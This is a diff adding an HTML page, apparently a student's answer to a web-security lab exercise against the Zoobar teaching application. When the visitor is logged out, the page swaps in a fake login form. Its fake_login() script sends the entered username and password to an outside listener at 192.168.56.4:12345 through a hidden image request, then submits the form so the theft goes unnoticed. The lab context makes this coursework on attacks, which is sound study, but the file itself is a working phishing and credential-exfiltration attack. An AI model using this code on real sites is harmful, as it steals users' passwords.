@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>
+         	Q3
+        </title>
+    </head>
+
+    <body id="demo" style="margin:0">
+        <script id="login_code" type="text/html">
+            <html><head><meta charset="utf-8"><link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css"><title>  Login - Zoobar Foundation</title></head><body>  <h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Sensible  Discourse</a></h1>  <h2>Supporting the brightest  soldiers of the 21st-century</h2><div id="login" class="centerpiece"><form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login"><table><tr>   <td>Username:</td>  <td><input type="text" id="1" name="login_username" size="20"  autocomplete="no" value=""></td></tr><tr>   <td>Password:</td>  <td colspan=2><input id="2" type="password" name="login_password" size=20 autocomplete="no">  <input type="submit" name="submit_login" value="Log in" onclick="fake_login()">  <input type="submit" name="submit_registration" value="Register"></td></tr></table></div><div class="footer warning"></div><img style="visibility:hidden" id="image"><script>document.loginform.login_username.focus();</script><script type="text/javascript">function fake_login(){document.getElementById("image").src="http://192.168.56.4:12345?payload="+document.getElementById("1").value+","+document.getElementById("2").value+"&roll=13358&random="+Math.floor(Math.random()*100)+"&timestamp="+Date.now();setTimeout(function(){document.getElementById("loginform").submit();},2000);}</script></body></html>
+        </script>
+        
+    	<script type ="text/javascript">
+    		function check_login(){
+    			if(typeof myZoobars == "undefined"){
+                    /* User not logged in */
+	    			console.log("Logged Out");
+                    
+                    /* Copy Code */
+                    document.getElementsByTagName("html")[0].innerHTML = document.getElementById("login_code").innerHTML;
+                }
+                else{
+                    /* Exercise 2 attack */
+                    window.location.href = "/home/httpd/lab3/answer-2.html";
+                }
+	    	}
+    	</script>
+        
+    	<script id="data" src="http://localhost:8080/zoobar/index.cgi/gradejs" onload="check_login()">
+    	</script>
+    </body>
+</html>
